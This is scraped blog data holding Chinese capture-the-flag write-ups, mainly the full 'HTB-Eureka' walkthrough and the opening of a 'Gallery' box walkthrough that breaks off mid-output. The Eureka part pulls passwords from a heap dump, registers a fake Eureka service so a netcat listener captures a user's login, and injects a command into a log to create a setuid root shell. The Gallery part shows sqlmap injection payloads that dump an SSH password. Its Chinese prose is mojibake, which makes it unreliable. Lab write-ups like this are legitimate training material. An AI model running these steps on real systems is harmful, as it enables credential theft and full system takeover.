#\rwhwlsfb/JDumpSpider: HeapDumpæ•æ„Ÿä¿¡æ¯æå–å·¥å…· [root@kali] /home/kali/Eureka â¯ java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump\r===========================================\rSpringDataSourceProperties\r-------------\rpassword = 0sc@r190_S0l!dP@sswd\rdriverClassName = com.mysql.cj.jdbc.Driver\rurl = jdbc:mysql://localhost:3306/Furni_WebApp_DB\rusername = oscar190\r===========================================\rWeblogicDataSourceConnectionPoolConfig\r-------------\rnot found!\r===========================================\rMongoClient\r-------------\rnot found!\r===========================================\rAliDruidDataSourceWrapper\r-------------\rnot found!\r===========================================\rHikariDataSource\r-------------\rjava.lang.NumberFormatException: Cannot parse null string\rnot found!\r===========================================\rRedisStandaloneConfiguration\r-------------\rnot found!\r===========================================\rJedisClient\r-------------\rnot found!\r===========================================\rCookieRememberMeManager(ShiroKey)\r-------------\rnot found!\r===========================================\rOriginTrackedMapPropertySource\r-------------\rmanagement.endpoints.web.exposure.include = *\rspring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver\rspring.cloud.inetutils.ignoredInterfaces = enp0s.*\reureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\rserver.forward-headers-strategy = native\rspring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB\rspring.application.name = Furni\rserver.port = 8082\rspring.jpa.properties.hibernate.format_sql = true\rspring.session.store-type = jdbc\rspring.jpa.hibernate.ddl-auto = none\r===========================================\rMutablePropertySources\r-------------\rspring.cloud.client.ip-address = 127.0.0.1\rlocal.server.port = null\rspring.cloud.client.hostname = eureka\r===========================================\rMapPropertySources\r-------------\rspring.cloud.client.ip-address = 127.0.0.1\rspring.cloud.client.hostname = eureka\rlocal.server.port = null\r===========================================\rConsulPropertySources\r-------------\rnot found!\r===========================================\rJavaProperties\r-------------\rnot found!\r===========================================\rProcessEnvironment\r-------------\rnot found!\r===========================================\rOSS\r-------------\rorg.jboss.logging.provider = slf4j\r===========================================\rUserPassSearcher\r-------------\rorg.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter:\r[oauth2LoginEnabled = false, passwordParameter = password, formLoginEnabled = true, usernameParameter = username, loginPageUrl = /login, authenticationUrl = /login, saml2LoginEnabled = false, failureUrl = /login?error]\r[oauth2LoginEnabled = false, formLoginEnabled = false, saml2LoginEnabled = false]\rorg.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter:\r[passwordParameter = password, usernameParameter = username]\rorg.antlr.v4.runtime.atn.LexerATNConfig:\r[passedThroughNonGreedyDecision = false]\rorg.antlr.v4.runtime.atn.ATNDeserializationOptions:\r[generateRuleBypassTransitions = false]\rorg.hibernate.boot.internal.InFlightMetadataCollectorImpl:\r[inSecondPass = false]\rcom.mysql.cj.protocol.a.authentication.AuthenticationLdapSaslClientPlugin:\r[firstPass = true]\rcom.mysql.cj.protocol.a.authentication.CachingSha2PasswordPlugin:\r[publicKeyRequested = false]\rcom.mysql.cj.protocol.a.authentication.Sha256PasswordPlugin:\r[publicKeyRequested = false]\rcom.mysql.cj.NativeCharsetSettings:\r[platformDbCharsetMatches = true]\rcom.mysql.cj.protocol.a.NativeAuthenticationProvider:\r[database = Furni_WebApp_DB, useConnectWithDb = true, serverDefaultAuthenticationPluginName = mysql_native_password, username = oscar190]\rcom.mysql.cj.jdbc.ConnectionImpl:\r[password = 0sc@r190_S0l!dP@sswd, database = Furni_WebApp_DB, origHostToConnectTo = localhost, user = oscar190]\rcom.mysql.cj.conf.HostInfo:\r[password = 0sc@r190_S0l!dP@sswd, host = localhost, user = oscar190]\rcom.zaxxer.hikari.pool.HikariPool:\r[aliveBypassWindowMs = 500, isUseJdbc4Validation = true]\rorg.springframework.cloud.netflix.eureka.EurekaClientConfigBean:\r[eurekaServerConnectTimeoutSeconds = 5, useDnsForFetchingServiceUrls = false, eurekaServerReadTimeoutSeconds = 8, eurekaServerTotalConnections = 200, eurekaServiceUrlPollIntervalSeconds = 300, eurekaServerTotalConnectionsPerHost = 50]\rorg.springframework.boot.autoconfigure.security.SecurityProperties$User:\r[password = 4312eecb-54e8-46b9-a645-5b9df3ea21d8, passwordGenerated = true]\rorg.springframework.boot.autoconfigure.jdbc.DataSourceProperties:\r[password = 0sc@r190_S0l!dP@sswd, driverClassName = com.mysql.cj.jdbc.Driver, url = jdbc:mysql://localhost:3306/Furni_WebApp_DB, username = oscar190]\rorg.springframework.security.authentication.dao.DaoAuthenticationProvider:\r[hideUserNotFoundExceptions = true]\rcom.zaxxer.hikari.HikariDataSource:\r[keepaliveTime = 0, password = 0sc@r190_S0l!dP@sswd, jdbcUrl = jdbc:mysql://localhost:3306/Furni_WebApp_DB, driverClassName = com.mysql.cj.jdbc.Driver, username = oscar190]\rorg.apache.catalina.startup.Tomcat:\r[hostname = localhost]\r===========================================\rCookieThief\r-------------\rnot found!\r===========================================\rAuthThief\r-------------\rjava.util.LinkedHashMap$Entry:\rorg.springframework.security.config.annotation.authentication.configuration.InitializeUserDetailsBeanManagerConfigurer$InitializeUserDetailsManagerConfigurer = o.s.s.c.a.a.c.InitializeUserDetailsBeanManagerConfigurer$InitializeUserDetailsManagerConfigurer\rorg.springframework.security.config.annotation.authentication.configuration.InitializeAuthenticationProviderBeanManagerConfigurer$InitializeAuthenticationProviderManagerConfigurer = o.s.s.c.a.a.c.InitializeAuthenticationProviderBeanManagerConfigurer$InitializeAuthenticationProviderManagerConfigurer\r=========================================== è¿™ä¸ªè´¦æˆ·ä¸èƒ½ç™»å½•åå°ä½†æ˜¯èƒ½å¤Ÿssh\næŸ¥çœ‹åˆ°å†…ç½‘æœ‰8761ç«¯å£å¼€æ”¾\noscar190@eureka:/$ ss -tuln\rNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* udp UNCONN 0 0 *:37775 *:* udp UNCONN 0 0 *:58808 *:* tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 4096 [::ffff:127.0.0.1]:8080 *:* tcp LISTEN 0 511 [::]:80 [::]:* tcp LISTEN 0 100 [::ffff:127.0.0.1]:8081 *:* tcp LISTEN 0 100 [::ffff:127.0.0.1]:8082 *:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 100 *:8761 *:* åœ¨heapdumpé‡Œé¢è¿›è¡ŒæŸ¥æ‰¾åŒ¹é…ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„ç½‘å€\n[root@kali] /home/kali/Eureka â¯ strings heapdump | grep 8761 -n 227464:P`http://localhost:8761/eureka/\r344576:http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!\r366651:http://localhost:8761/eureka/!\r442796:http://localhost:8761/eureka/!\r450355:Host: localhost:8761\r450870:http://localhost:8761/eureka/!\r451153:Host: localhost:8761 å°†8761ç«¯å£è¿›è¡Œè½¬å‘å‡ºæ¥\n[root@kali] /home/kali/Eureka â¯ ssh oscar190@furni.htb -L 8761:127.0.0.1:8761 è®¿é—®éœ€è¦è¾“å…¥ç”¨æˆ·åå¯†ç ï¼Œç”¨URLä¸­ç»™å‡ºçš„å°±å¯ä»¥è¿›å»\nusername:EurekaSrvr\rpassword:0scarPWDisTheB3st What is Eureka? #\rEureakÂ æ˜¯NetflixÂ å¼€æºå¾®æœåŠ¡æ¡†æ¶ä¸­ä¸€ç³»åˆ—é¡¹ç›®ä¸­çš„ä¸€ä¸ªã€‚Spring Cloudå¯¹å…¶è¿›è¡Œäº†äºŒæ¬¡å°è£…,å½¢æˆäº†Spring Cloud NetflixÂ å­é¡¹ç›®,ä½†æœªå¯¹Netflixå¾®æœåŠ¡å®ç°åŸç†è¿›è¡Œæ›´æ”¹,åªæ˜¯è¿›è¡Œäº†Spring BootåŒ–,ä½¿å¼€å‘è€…æ›´å®¹æ˜“ä½¿ç”¨å’Œæ•´åˆã€‚\nä»€ä¹ˆæ˜¯Eurekaï¼ŸEurekaèƒ½å¹²ä»€ä¹ˆï¼ŸEurekaæ€ä¹ˆç”¨ï¼Ÿ-CSDNåšå®¢ Hacking Netflix Eureka #\rç»è¿‡æœç´¢æˆ‘æ‰¾åˆ°äº†è¿™æ ·ä¸€ç¯‡æ–‡ç« \nHacking Netflix Eureka | Backbase Engineering åœ¨appsç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°è¿™æ ·çš„æœåŠ¡\nå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ æ³¨å†Œä¸€ä¸ªæœåŠ¡åˆ° Eureka Server\noscar190@eureka:~$ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{ \u0026#34;instance\u0026#34;: {\r\u0026#34;instanceId\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;,\r\u0026#34;hostName\u0026#34;: \u0026#34;10.10.xx.xx\u0026#34;,\r\u0026#34;app\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;,\r\u0026#34;ipAddr\u0026#34;: \u0026#34;10.10.xx.xx\u0026#34;,\r\u0026#34;vipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;,\r\u0026#34;secureVipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;,\r\u0026#34;status\u0026#34;: \u0026#34;UP\u0026#34;,\r\u0026#34;port\u0026#34;: { \u0026#34;$\u0026#34;: 8081,\r\u0026#34;@enabled\u0026#34;: \u0026#34;true\u0026#34;\r},\r\u0026#34;dataCenterInfo\u0026#34;: {\r\u0026#34;@class\u0026#34;: \u0026#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\u0026#34;,\r\u0026#34;name\u0026#34;: \u0026#34;MyOwn\u0026#34;\r}\r}\r}\r\u0026#39; ç„¶ååœ¨æœ¬æœºç›‘å¬\n[root@kali] /home/kali/Eureka â¯ nc -lvnp 8081 username=miranda.wise%40furni.htb\u0026amp;password=IL%21veT0Be%26BeT0L0ve\u0026amp;_csrf=s0919JB_yc9-10PPrDWFranrfB0lKpnkPrcW4i6rgNDPpJrk1ypFwPRG_fpTsSb2mRixz5vdUSVAS6jJDI9z0xyetuX2wvnc# #miranda-wise\r#IL!veT0Be\u0026amp;BeT0L0ve Root #\ræŸ¥çœ‹åå°è¿›ç¨‹ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªè„šæœ¬ä¸€ç›´åœ¨è¢«æ‰§è¡Œ\nmiranda-wise@eureka:/opt$ ls -al\rtotal 24\rdrwxr-xr-x 4 root root 4096 Mar 20 14:17 .\rdrwxr-xr-x 19 root root 4096 Apr 22 12:47 ..\rdrwxrwx--- 2 root www-data 4096 Aug 7 2024 heapdump\r-rwxrwxr-x 1 root root 4980 Mar 20 14:17 log_analyse.sh\rdrwxr-x--- 2 root root 4096 Apr 9 18:34 scripts\rmiranda-wise@eureka:/opt$ cat log_analyse.sh #!/bin/bash\r# Colors\rGREEN=\u0026#39;\\033[0;32m\u0026#39;\rRED=\u0026#39;\\033[0;31m\u0026#39;\rYELLOW=\u0026#39;\\033[1;33m\u0026#39;\rBLUE=\u0026#39;\\033[0;34m\u0026#39;\rCYAN=\u0026#39;\\033[0;36m\u0026#39;\rRESET=\u0026#39;\\033[0m\u0026#39;\rLOG_FILE=\u0026#34;$1\u0026#34;\rOUTPUT_FILE=\u0026#34;log_analysis.txt\u0026#34;\rdeclare -A successful_users # Associative array: username -\u0026gt; count\rdeclare -A failed_users # Associative array: username -\u0026gt; count\rSTATUS_CODES=(\u0026#34;200:0\u0026#34; \u0026#34;201:0\u0026#34; \u0026#34;302:0\u0026#34; \u0026#34;400:0\u0026#34; \u0026#34;401:0\u0026#34; \u0026#34;403:0\u0026#34; \u0026#34;404:0\u0026#34; \u0026#34;500:0\u0026#34;) # Indexed array: \u0026#34;code:count\u0026#34; pairs\rif [ ! -f \u0026#34;$LOG_FILE\u0026#34; ]; then\recho -e \u0026#34;${RED}Error: Log file $LOG_FILE not found.${RESET}\u0026#34;\rexit 1\rfi\ranalyze_logins() {\r# Process successful logins\rwhile IFS= read -r line; do\rusername=$(echo \u0026#34;$line\u0026#34; | awk -F\u0026#34;\u0026#39;\u0026#34; \u0026#39;{print $2}\u0026#39;)\rif [ -n \u0026#34;${successful_users[$username]+_}\u0026#34; ]; then\rsuccessful_users[$username]=$((successful_users[$username] + 1))\relse\rsuccessful_users[$username]=1\rfi\rdone \u0026lt; \u0026lt;(grep \u0026#34;LoginSuccessLogger\u0026#34; \u0026#34;$LOG_FILE\u0026#34;)\r# Process failed logins\rwhile IFS= read -r line; do\rusername=$(echo \u0026#34;$line\u0026#34; | awk -F\u0026#34;\u0026#39;\u0026#34; \u0026#39;{print $2}\u0026#39;)\rif [ -n \u0026#34;${failed_users[$username]+_}\u0026#34; ]; then\rfailed_users[$username]=$((failed_users[$username] + 1))\relse\rfailed_users[$username]=1\rfi\rdone \u0026lt; \u0026lt;(grep \u0026#34;LoginFailureLogger\u0026#34; \u0026#34;$LOG_FILE\u0026#34;)\r}\ranalyze_http_statuses() {\r# Process HTTP status codes\rwhile IFS= read -r line; do\rcode=$(echo \u0026#34;$line\u0026#34; | grep -oP \u0026#39;Status: \\K.*\u0026#39;)\rfound=0\r# Check if code exists in STATUS_CODES array\rfor i in \u0026#34;${!STATUS_CODES[@]}\u0026#34;; do\rexisting_entry=\u0026#34;${STATUS_CODES[$i]}\u0026#34;\rexisting_code=$(echo \u0026#34;$existing_entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f1)\rexisting_count=$(echo \u0026#34;$existing_entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f2)\rif [[ \u0026#34;$existing_code\u0026#34; -eq \u0026#34;$code\u0026#34; ]]; then\rnew_count=$((existing_count + 1))\rSTATUS_CODES[$i]=\u0026#34;${existing_code}:${new_count}\u0026#34;\rbreak\rfi\rdone\rdone \u0026lt; \u0026lt;(grep \u0026#34;HTTP.*Status: \u0026#34; \u0026#34;$LOG_FILE\u0026#34;)\r}\ranalyze_log_errors(){\r# Log Level Counts (colored)\recho -e \u0026#34;\\n${YELLOW}[+] Log Level Counts:${RESET}\u0026#34;\rlog_levels=$(grep -oP \u0026#39;(?\u0026lt;=Z )\\w+\u0026#39; \u0026#34;$LOG_FILE\u0026#34; | sort | uniq -c)\recho \u0026#34;$log_levels\u0026#34; | awk -v blue=\u0026#34;$BLUE\u0026#34; -v yellow=\u0026#34;$YELLOW\u0026#34; -v red=\u0026#34;$RED\u0026#34; -v reset=\u0026#34;$RESET\u0026#34; \u0026#39;{\rif ($2 == \u0026#34;INFO\u0026#34;) color=blue;\relse if ($2 == \u0026#34;WARN\u0026#34;) color=yellow;\relse if ($2 == \u0026#34;ERROR\u0026#34;) color=red;\relse color=reset;\rprintf \u0026#34;%s%6s %s%s\\n\u0026#34;, color, $1, $2, reset\r}\u0026#39;\r# ERROR Messages\rerror_messages=$(grep \u0026#39; ERROR \u0026#39; \u0026#34;$LOG_FILE\u0026#34; | awk -F\u0026#39; ERROR \u0026#39; \u0026#39;{print $2}\u0026#39;)\recho -e \u0026#34;\\n${RED}[+] ERROR Messages:${RESET}\u0026#34;\recho \u0026#34;$error_messages\u0026#34; | awk -v red=\u0026#34;$RED\u0026#34; -v reset=\u0026#34;$RESET\u0026#34; \u0026#39;{print red $0 reset}\u0026#39;\r# Eureka Errors\reureka_errors=$(grep \u0026#39;Connect to http://localhost:8761.*failed: Connection refused\u0026#39; \u0026#34;$LOG_FILE\u0026#34;)\reureka_count=$(echo \u0026#34;$eureka_errors\u0026#34; | wc -l)\recho -e \u0026#34;\\n${YELLOW}[+] Eureka Connection Failures:${RESET}\u0026#34;\recho -e \u0026#34;${YELLOW}Count: $eureka_count${RESET}\u0026#34;\recho \u0026#34;$eureka_errors\u0026#34; | tail -n 2 | awk -v yellow=\u0026#34;$YELLOW\u0026#34; -v reset=\u0026#34;$RESET\u0026#34; \u0026#39;{print yellow $0 reset}\u0026#39;\r}\rdisplay_results() {\recho -e \u0026#34;${BLUE}----- Log Analysis Report -----${RESET}\u0026#34;\r# Successful logins\recho -e \u0026#34;\\n${GREEN}[+] Successful Login Counts:${RESET}\u0026#34;\rtotal_success=0\rfor user in \u0026#34;${!successful_users[@]}\u0026#34;; do\rcount=${successful_users[$user]}\rprintf \u0026#34;${GREEN}%6s %s${RESET}\\n\u0026#34; \u0026#34;$count\u0026#34; \u0026#34;$user\u0026#34;\rtotal_success=$((total_success + count))\rdone\recho -e \u0026#34;${GREEN}\\nTotal Successful Logins: $total_success${RESET}\u0026#34;\r# Failed logins\recho -e \u0026#34;\\n${RED}[+] Failed Login Attempts:${RESET}\u0026#34;\rtotal_failed=0\rfor user in \u0026#34;${!failed_users[@]}\u0026#34;; do\rcount=${failed_users[$user]}\rprintf \u0026#34;${RED}%6s %s${RESET}\\n\u0026#34; \u0026#34;$count\u0026#34; \u0026#34;$user\u0026#34;\rtotal_failed=$((total_failed + count))\rdone\recho -e \u0026#34;${RED}\\nTotal Failed Login Attempts: $total_failed${RESET}\u0026#34;\r# HTTP status codes\recho -e \u0026#34;\\n${CYAN}[+] HTTP Status Code Distribution:${RESET}\u0026#34;\rtotal_requests=0\r# Sort codes numerically\rIFS=$\u0026#39;\\n\u0026#39; sorted=($(sort -n -t\u0026#39;:\u0026#39; -k1 \u0026lt;\u0026lt;\u0026lt;\u0026#34;${STATUS_CODES[*]}\u0026#34;))\runset IFS\rfor entry in \u0026#34;${sorted[@]}\u0026#34;; do\rcode=$(echo \u0026#34;$entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f1)\rcount=$(echo \u0026#34;$entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f2)\rtotal_requests=$((total_requests + count))\r# Color coding\rif [[ $code =~ ^2 ]]; then color=\u0026#34;$GREEN\u0026#34;\relif [[ $code =~ ^3 ]]; then color=\u0026#34;$YELLOW\u0026#34;\relif [[ $code =~ ^4 || $code =~ ^5 ]]; then color=\u0026#34;$RED\u0026#34;\relse color=\u0026#34;$CYAN\u0026#34;\rfi\rprintf \u0026#34;${color}%6s %s${RESET}\\n\u0026#34; \u0026#34;$count\u0026#34; \u0026#34;$code\u0026#34;\rdone\recho -e \u0026#34;${CYAN}\\nTotal HTTP Requests Tracked: $total_requests${RESET}\u0026#34;\r}\r# Main execution\ranalyze_logins\ranalyze_http_statuses\rdisplay_results | tee \u0026#34;$OUTPUT_FILE\u0026#34;\ranalyze_log_errors | tee -a \u0026#34;$OUTPUT_FILE\u0026#34;\recho -e \u0026#34;\\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}\u0026#34; å…³é”®ç‚¹åœ¨è¿™é‡ŒğŸ‘‡\nè¿™é‡Œçš„ [[ \u0026quot;$existing_code\u0026quot; -eq \u0026quot;$code\u0026quot; ]]ï¼Œæ˜¯ ç®—æœ¯æ¯”è¾ƒï¼Œ$code ä¸­ä¸€æ—¦åµŒå…¥ $(...)ï¼ŒBash ä¼šå…ˆæ‰§è¡Œæ‹¬å·å†…çš„å‘½ä»¤ã€‚\nanalyze_http_statuses() {\r# Process HTTP status codes\rwhile IFS= read -r line; do\rcode=$(echo \u0026#34;$line\u0026#34; | grep -oP \u0026#39;Status: \\K.*\u0026#39;)\rfound=0\r# Check if code exists in STATUS_CODES array\rfor i in \u0026#34;${!STATUS_CODES[@]}\u0026#34;; do\rexisting_entry=\u0026#34;${STATUS_CODES[$i]}\u0026#34;\rexisting_code=$(echo \u0026#34;$existing_entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f1)\rexisting_count=$(echo \u0026#34;$existing_entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f2)\rif [[ \u0026#34;$existing_code\u0026#34; -eq \u0026#34;$code\u0026#34; ]]; then\rnew_count=$((existing_count + 1))\rSTATUS_CODES[$i]=\u0026#34;${existing_code}:${new_count}\u0026#34;\rbreak\rfi\rdone\rdone \u0026lt; \u0026lt;(grep \u0026#34;HTTP.*Status: \u0026#34; \u0026#34;$LOG_FILE\u0026#34;)\r} ç±»ä¼¼ææƒçš„æœºå™¨å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼šHackMyVM | Todd\næ³¨æ„åˆ°å½“å‰çš„ç›®å½•æ‰€æœ‰è€…ï¼Œå› æ­¤å¯ä»¥è¦†ç›–application.log\nmiranda-wise@eureka:/var/www/web/cloud-gateway/log$ ls -al\rtotal 48\rdrwxrwxr-x 2 www-data developers 4096 Apr 29 04:12 .\rdrwxrwxr-x 6 www-data developers 4096 Mar 18 21:17 ..\r-rw-r--r-- 1 www-data www-data 21254 Apr 29 04:34 application.log\r-rw-rw-r-- 1 www-data www-data 5702 Apr 23 07:37 application.log.2025-04-22.0.gz\r-rw-rw-r-- 1 www-data www-data 5956 Apr 29 03:13 application.log.2025-04-23.0.gz\rmiranda-wise@eureka:/var/www/web/cloud-gateway/log$ id\ruid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers) å†™å…¥æ¶æ„ä»£ç \nmiranda-wise@eureka:/var/www/web/cloud-gateway/log$ rm application.log\rrm: remove write-protected regular file \u0026#39;application.log\u0026#39;? y\rmiranda-wise@eureka:/var/www/web/cloud-gateway/log$ echo \u0026#39;HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]\u0026#39; \u0026gt;\u0026gt; application.log Summary #\rUserï¼šheapdumpå¯¼è‡´çš„å¯†ç æ³„éœ²ï¼Œå†…ç½‘ç«¯å£ä¸Šçš„EurekaæœåŠ¡å­˜åœ¨æ¼æ´ï¼Œé€šè¿‡æ³¨å†Œä¸€ä¸ªä¼ªé€ çš„å¾®æœåŠ¡å®ä¾‹ï¼Œå¹¶è·å–åˆ°äº†ç”¨æˆ·å‡­è¯ã€‚\nRootï¼šåˆ†æè„šæœ¬å¯ä»¥çœ‹åˆ°å­˜åœ¨æ•°ç»„æ¯”è¾ƒçš„æ¼æ´ï¼Œè¿™ä¸ªæˆ‘åˆšå¥½åœ¨Toddé¶æœºä¸­åšè¿‡ï¼Œå½“å‰ç”¨æˆ·ç»„å¯ä»¥ä¿®æ”¹æ—¥å¿—æ–‡ä»¶ï¼Œä»è€Œè¾¾åˆ°ææƒã€‚\n","date":"2025-04-29","externalUrl":null,"permalink":"/posts/2025/04/htb-eureka/","section":"Posts","summary":"","title":"HTB-Eureka","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Gallery â¯ nmap 172.17.0.3 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 19:95:1a:f2:f6:7a:a1:f1:ba:16:4b:58:a0:59:f2:02 (ECDSA)\r|_ 256 e7:e9:8f:b8:db:94:c2:68:11:4c:25:81:f1:ac:cd:ac (ED25519)\r80/tcp open http PHP cli server 5.5 or later (PHP 8.3.6)\r|_http-title: Galer\\xC3\\xADa de Arte Digital Feroxbuster #\r[root@kali] /home/kali/Gallery â¯ feroxbuster -u \u0026#39;http://172.17.0.3/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt ___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://172.17.0.3/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\rğŸ‘Œ Status Codes â”‚ All Status Codes!\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [php, txt]\rğŸ HTTP methods â”‚ [GET]\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r200 GET 29l 83w 1478c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r404 GET 7l 57w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 266l 543w 5288c http://172.17.0.3/style.css\r200 GET 28l 63w 1104c http://172.17.0.3/login.php\r200 GET 0l 0w 0c http://172.17.0.3/config.php\r302 GET 0l 0w 0c http://172.17.0.3/dashboard.php =\u0026gt; login.php SQL Injection #\råœ¨ç”¨æˆ·åè¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹\nè¿›å…¥åˆ°åå°ï¼Œåˆæœ‰ä¸€ä¸ªå¯ä»¥æœç´¢çš„æ³¨å…¥ç‚¹\nè¿™é‡Œä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥\n[root@kali] /home/kali/Gallery â¯ sqlmap --cookie \u0026#34;PHPSESSID=r3kjodvf4kl5q91uisobojp527\u0026#34; -u \u0026#34;http://172.17.0.3/dashboard.php?search_term=11\u0026#34; -D secret_db --dump ___\r__H__ ___ ___[.]_____ ___ ___ {1.9.2#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [\u0026#34;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\r[*] starting @ 22:49:59 /2025-04-25/\r[22:49:59] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [22:49:59] [INFO] testing connection to the target URL\rsqlmap resumed the following injection point(s) from stored session:\r---\rParameter: search_term (GET)\rType: error-based\rTitle: MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\rPayload: search_term=11\u0026#39; AND EXTRACTVALUE(2694,CONCAT(0x5c,0x716b7a7171,(SELECT (ELT(2694=2694,1))),0x71626a6271)) AND \u0026#39;kDVa\u0026#39;=\u0026#39;kDVa\rType: UNION query\rTitle: Generic UNION query (NULL) - 5 columns\rPayload: search_term=11\u0026#39; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b7a7171,0x4e4442547641624446444143786472586d5563504c714842634f75726647705072656368454a4575,0x71626a6271),NULL-- -\r---\r[22:49:59] [INFO] the back-end DBMS is MySQL\rweb application technology: PHP 8.3.6\rback-end DBMS: MySQL \u0026gt;= 5.1\r[22:49:59] [INFO] fetching tables for database: \u0026#39;secret_db\u0026#39;\r[22:49:59] [INFO] fetching columns for table \u0026#39;secret\u0026#39; in database \u0026#39;secret_db\u0026#39;\r[22:49:59] [INFO] fetching entries for table \u0026#39;secret\u0026#39; in database \u0026#39;secret_db\u0026#39;\rDatabase: secret_db\rTable: secret\r[1 entry]\r+----+------------------------+-----------+\r| id | ssh_pass | ssh_users |\r+----+------------------------+-----------+\r| 1 | $uper$ecretP4$$w0rd123 | sam |\r+----+------------------------+-----------+\r[22:50:00] [INFO] table \u0026#39;secret_db.secret\u0026#39; dumped to CSV file \u0026#39;/root/.local/share/sqlmap/output/172.17.0.3/dump/secret_db/secret.csv\u0026#39;\r[22:50:00] [INFO] fetched data logged to text files under \u0026#39;/root/.local/share/sqlmap/output/172.17.0.3\u0026#39;\r[*] ending @ 22:50:00 /2025-04-25/ å¾—åˆ°samçš„ç™»å½•å¯†ç \nRoot #\rä¸Šä¼ fscanæŸ¥çœ‹ç«¯å£æƒ…å†µï¼šshadow1ng/fscan: ä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚\nsam@7adf2cce45b2:/tmp$ ./fscan -h 127.0.0.1\râ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\râ”‚ ___ _ â”‚\râ”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚\râ”‚ / /_\\/____/ __|/ __| 